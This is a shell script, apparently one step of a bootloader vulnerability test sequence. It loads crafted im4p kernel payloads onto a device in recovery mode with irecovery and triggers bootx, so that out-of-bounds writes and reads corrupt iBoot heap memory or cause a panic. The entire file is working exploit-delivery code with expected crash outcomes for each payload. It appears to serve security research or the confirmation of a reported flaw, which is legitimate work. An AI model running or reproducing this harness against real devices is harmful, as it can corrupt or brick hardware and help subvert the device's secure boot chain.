#!/bin/bash
# step3_poc_seq.sh — DEVICE PoC RUNS (escalating). PREREQ: step1 shows the shell alive AND
# step2 showed decode-runs-before-verdict (or silence-but-reset semantics understood).
# Each cell: send the wrapped stream as 'krnl', bootx it. EXPECTED receipt per report:
#   R1: reset/hang (OOB 16KB write lands in iBoot heap -> corruption) or watchdog reboot
#   R2: same class (64KB past capacity)
#   R3: fault (unmapped read) -> panic/reset
# A clean bootx-error return with no state change = PoC stream did NOT reach the decoder
# at the claimed offsets on THIS build (device answers what the harness asserted).
# After each cell: wait for USB state; if stuck, run step9_recover.sh.
set -u
cd "$(dirname "$0")"
OUT="results/step3_$(date +%Y%m%d_%H%M%S).log"; mkdir -p results
log(){ echo "[step3] $*" | tee -a "$OUT"; }

CELLS="${*:-payloads/r1_deflate_krnl.im4p}"
for P in $CELLS; do
  log "=== cell $P ==="
  log "put device in recovery if it rebooted (vol+, vol-, hold side), then continue (5s)"
  for i in $(seq 1 60); do irecovery -m >/dev/null 2>&1 && break; sleep 2; done
  irecovery -m >/dev/null 2>&1 || { log "no recovery device after wait - stopping"; break; }
  S=$(stat -f%z "$P")
  # filesize first (sh_memboot reads the env var; IBEC_IBSS §2), then upload, then bootx
  irecovery -c "setenv filesize $S" 2>&1 | tee -a "$OUT"
  T0=$(date +%s)
  irecovery -f "$P" 2>&1 | tee -a "$OUT"
  TSEND=$(( $(date +%s)-T0 ))
  T0=$(date +%s)
  timeout 20 irecovery -c "bootx" 2>&1 | tee -a "$OUT"
  log "send=${TSEND}s bootx=$(( $(date +%s)-T0 ))s rc=$?"
  log "observe device screen/USB: reboot-to-recovery = decoder consumed the bytes"
done
log "ALL CELLS DONE - run step0_pullcrash.sh after booting normal (hold side btn, vol-down combo)"
